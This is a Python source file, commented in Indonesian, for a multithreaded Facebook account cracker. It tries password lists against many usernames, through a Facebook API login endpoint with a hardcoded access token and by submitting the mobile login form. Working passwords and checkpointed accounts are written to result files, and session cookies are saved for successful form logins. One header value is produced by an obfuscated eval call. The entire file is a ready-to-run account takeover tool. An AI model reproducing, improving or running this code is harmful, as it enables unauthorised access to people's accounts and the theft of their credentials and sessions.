# hallo bro :v

from modul import *
from .useragent import *
from .list_pass import pw_list
import concurrent.futures
import urllib.request

ok,cp,cout,live,chek,kontol=0,0,0,[],[],[]

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		while NAROSKEUN in (""," "):
			print(" ! jangan kosong ngentod")
			NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		if NAROSKEUN in tuple("yY"):
			print(" * contoh : bismillah,rahasia,indonesia")
			password=input(" ? set password : ")
			while len(password) < 6:
				print(" ! jangan kosong ngentod" if password in (""," ") else " ! password minimal 6 karakter")
				password=input(" ? set password : ")
			print(" * pilih method crack")
			print(" 1. method b-api (fast crack)")
			print(" 2. method free.facebook (slow crack)" if "free.facebook" in self.url else " 2. method mbasic (slow crack)")
			self.awokawok_ngentod(password.split(","))
		if NAROSKEUN in tuple("tT"):
			print(" * pilih method crack")
			print(" 1. method b-api (fast crack)")
			print(" 2. method free.facebook (slow crack)" if "free.facebook" in self.url else " 2. method mbasic (slow crack)")
			self.awokawok_ngentod()
		else:
			print(" ! isi yang bener ngentod");self.naroskeun()
			
	def awokawok_ngentod(self,p_asw=None):
		pilih=input(" ? pilih : ")
		while pilih in (""," "):
			print(" ! jangan kosong ngentod")
			pilih=input(" ? pilih : ")
		if pilih in ("1","01"):
			workers=50 if p_asw is None else 30
			self.awokawok_njir(self.api,workers,p_asw)
			self.result()
		if pilih in ("2","02"):
			workers=50 if p_asw is None else 30
			self.awokawok_njir(self.facebook,workers,p_asw)
			self.result()
		else:
			print(" ! isi yang bener ngentod");self.awokawok_ngentod(p_asw)
	
	def awokawok_njir(self,ntahlah,kecepatan,wokwok=None):
		for xnxx in self.user:
			xvideos=xnxx.split("(Aap Gans)")
			kontol.append({"username":xvideos[0],"password":pw_list(xvideos)} if wokwok is None else {"username":xvideos[0],"password":wokwok})
		print(" * crack started\n * ctrl+z to stop\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=kecepatan) as asw_lo:
			for x in kontol:
				asw_lo.submit(ntahlah,x["username"],x["password"])
					
	def facebook(self,username,list_password,**awok):
		global ok,cp,cout
		for password in list_password:
			ses=req.session()
			try: respon=ses.get(f"{self.url}/login/?next&ref=dbl&refid=8").text
			except koneksi_error: self.facebook(username,list_password)
			awok.update({x["name"]:x["value"] for x in parser(respon,"html.parser").find_all("input",{"value":True})})
			if "sign_up" in awok and "_fb_noscript" in awok:
				del awok["sign_up"]
				del awok["_fb_noscript"]
			awok.update({"email":username,"pass":password})
			ses.headers.update({"Host":self.url.split("//")[1],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","origin":self.url,"user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","save-data":"on"})
			action=parser(respon,"html.parser").find("form",{"method":"post"})["action"]
			try: ses.post(self.url+action,data=awok,allow_redirects=False)
			except koneksi_error: self.facebook(username,list_password)
			cookie=ses.cookies.get_dict()
			if "c_user" in cookie:
				ok+=1
				cookies=";".join([_+"="+__ for _,__ in cookie.items()])
				self.save(f" \x1b[1;32m*--> {cookie['c_user']}|{password}|{cookies}","result/live.txt",live)
				break
			elif "checkpoint" in cookie:
				cp+=1
				uid=urllib.request.unquote(cookie["checkpoint"])
				uid=json.loads(uid)["u"] if '"u":' in uid else username
				self.save(f" \x1b[1;33m*--> {uid}|{password}","result/chek.txt",chek)
				break
			else: continue
		cout+=1
		print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		
	def api(self,username,list_password):
		global ok,cp,cout
		for password in list_password:
			try: respon=req.get("https://b-api.facebook.com/method/auth.login",params={"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
			except koneksi_error: self.api(username,list_password)
			if "session_key" in respon.text and "EAAA" in respon.text:
				ok+=1
				self.save(f" \x1b[1;32m*--> {username}|{password}","result/live.txt",live)
				break
			elif "www.facebook.com" in respon.json()["error_msg"]:
				cp+=1
				self.save(f" \x1b[1;33m*--> {username}|{password}","result/chek.txt",chek)
				break
			else: continue
		cout+=1
		print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
	
	def save(self,*args):
		print(f"\r{args[0]}\x1b[0m\n",end="")
		lol=re.findall("> (.+)",args[0])[0]
		open(args[1],"a").write(lol+"\n")
		args[2].append(lol)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n * done gan\n * live/chek : {len(live)}/{len(chek)}")
			if len(live)!=0: print(" * hasil live tersimpan di file : result/live.txt")
			if len(chek)!=0: print(" * hasil chek tersimpan di file : result/chek.txt")
			exit()
		else: exit("\n\n ! tidak mendapatkan hasil")
